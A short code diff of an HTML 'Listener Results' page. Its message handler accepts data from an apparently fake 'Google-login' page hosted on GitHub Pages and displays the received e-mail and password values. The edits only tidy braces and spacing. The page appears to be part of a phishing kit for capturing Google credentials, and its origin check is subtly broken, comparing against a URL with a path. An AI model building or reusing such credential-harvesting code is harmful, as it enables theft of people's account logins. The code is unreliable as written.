@@ -7,7 +7,7 @@
     <style>body {display: flex; flex-direction: column; justify-content: center; align-items: center;}</style>
 </head>
 <body>
-    <h1>Listener Results</h1> <br>
+    <h1>Listener Results</h1><br>
 
     <div align="center">E-mail:<br><span id="e-mail"></span></div> <br>
 
@@ -27,12 +27,10 @@
         window.onmessage = function(e){
         if ( e.origin !== "https://dominator200.github.io/Google-login/" ) {
             return;
-                };
-            }
-
+            };
         document.getElementById("PasswordValue").innerHTML = e.origin + " said: " + e.data;
         document.getElementById("EmailValue").innerHTML = e.origin + " said: " + e.data;
-        };
+        }
 
 
     <div id="messageDisplay"></div>
